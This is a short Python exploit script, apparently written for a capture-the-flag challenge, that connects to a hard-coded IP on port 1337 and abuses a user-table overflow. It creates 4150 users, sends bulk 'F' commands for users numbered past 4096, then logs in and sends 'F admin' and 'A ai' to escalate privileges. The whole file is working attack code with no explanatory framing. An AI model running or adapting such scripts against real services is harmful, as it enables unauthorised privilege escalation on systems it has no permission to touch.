import socket
from subprocess import Popen, PIPE


if __name__ == '__main__':
    delimiter = "\n"
    # with open('1.txt', 'w') as f:
    #     cmd = "Z {}".format('A'*81)
    #     f.write(cmd)
        # cmd_template = "C z{:04} aaaa" + delimiter
        # for i in range(4150):
        #     cmd = cmd_template.format(i)
        #     f.write(cmd)

        # cmd = "E z3000 aaaa" + delimiter
        # f.write(cmd)
        
        # for i in range(4096,4097):
        #     cmd = ("F z{:04}" + delimiter).format(i)
        #     f.write(cmd)
        

        # cmd = "E z3001 aaaa" + delimiter
        # f.write(cmd)

        # cmd = "E admin AdminPass" + delimiter
        # f.write(cmd)

        # cmd = "A ai" + delimiter
        # f.write(cmd)

        
    import time

    TCP_IP = '54.93.40.66'
    TCP_PORT = 1337
    BUFFER_SIZE = 1024

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TCP_IP, TCP_PORT))

    data = s.recv(1024)
    print(data)
    
    cmds = ""
    for i in range(4150):
        cmd_template = "C z{:04} aaaa\n"
        cmd = cmd_template.format(i)
        cmds += cmd
    s.send(cmds)    
    
    while True:
        data = s.recv(1024*1024)
        if "Num Users=4154." in data:
            break
    
    s.send("E z3000 aaaa\n")
    time.sleep(1)
    data = s.recv(1024*1024)
    print(data)

    cmds = ""
    for i in range(4097, 4110):
        cmds += "F z{:04}\n".format(i)
    s.send(cmds)

    time.sleep(1)
    data = s.recv(1024*1024)
    # print(data)

    s.send("E z3001 aaaa\nF admin\nA ai\n")
    # s.send("L\n")
    time.sleep(1)
    
    data = s.recv(1024*1024)
    print(data)

    
    s.close()
